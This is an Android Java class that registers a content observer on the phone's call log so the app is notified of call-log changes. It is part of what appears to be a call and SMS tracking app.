package call.log;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;
import android.util.Log;

import sms.log.SmsContentObserver;

public class ActivateCallObserver {
    private static final String TAG = "CALLTRACKER";
    private Context myContext;

    @SuppressWarnings("unused")
    private Intent myIntent;

    @SuppressWarnings("unused")
    private Bundle myExtras;

    private CallContentObserver observer = null;

    private Uri callUri = CallLog.Calls.CONTENT_URI;

    public void activateCallObserver(Context context)
    {
        Log.i(TAG,"Call Reciver Activated");
        try
        {
            myContext = context;

            if(observer  == null)
            {
                observer = new CallContentObserver(new Handler(), myContext);
                myContext.getContentResolver().registerContentObserver(callUri,true,observer);
            }

        } catch (Exception e)
        {
            Log.i(TAG,"Error :"+e.getMessage());
        }
    }

}
